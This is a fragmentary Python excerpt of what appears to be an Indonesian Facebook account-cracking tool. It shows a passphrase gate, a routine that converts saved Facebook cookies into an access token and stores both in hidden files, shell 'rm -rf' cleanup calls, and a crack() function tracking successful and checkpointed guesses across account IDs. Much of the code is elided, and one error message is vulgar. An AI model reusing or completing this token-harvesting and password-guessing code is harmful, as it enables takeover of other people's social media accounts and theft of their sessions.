...
{P}██╔══██╗██║███╗██║╚════██║ ██╔██╗ ╚════██║██║
{P}██████╔╝╚███╔███╔╝███████║██╔╝ ██╗███████║╚██████╗
{P}╚═════╝  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ \n\033[36;1m Req By \033[1;33;44m • \033[1;37m Bayu Tamvan  \033[1;33m• \033[0m\033[1;30m     {P}
""")
...
def bws123():
	os.system('clear')
	banner()
	cetak(nel("""\n[white][[cyan]•[white]] [green]Kamu Perlu Kata Kunci Untuk Masuk\n[white][[cyan]•[white]][green] Gunakan Kata Kunci[yellow] Bayu Ganteng[green] Untuk Masuk\n[bold white]""", subtitle="╭────[white][[blue]INPUT[white]][blue]", subtitle_align="left", title="[bold red]●[bold yellow]●[bold green]●[bold hot_pink2]INFORMASI[bold green]●[bold yellow]●[bold red]●",padding=(0,5),style=f"bold blue"))
	bws = input(N+''+B+'   ╰─ >  \033[32m')
	if bws in ['bayu ganteng','Bayu Ganteng','BAYU GANTENG']:
		login()
	elif bws in ['']:
...
def login():
	try:
		token = open('.bwstok.txt','r').read()
		cok = open('.bwscok.txt','r').read()
				...
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					...
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						...
						if 'Sukses!' in str(response6):
							...
							print(f"\n ╰─  Token : {access_token}")
							tokenew = open(".bwstok.txt","w").write(access_token)
							cook= open(".bwscok.txt","w").write(your_cookies)
							print("\n ╰─  Login Berhasil | python bws1.py");exit()
			except Exception as e:
				print(" ╰─  Cookies Mokad Kontol")
				os.system('rm -rf .bwstok.txt && rm -rf .bwscok.txt')
				print(e)
				time.sleep(3)
				back()
	except:pass
...
def menu(NAME,ID):
	...
	if _____rifan__ganteng_____ in ['1']:
		...
		os.system('rm -rf .bwstok.txt')
		os.system('rm -rf .bwscok.txt')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\rBWS {P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
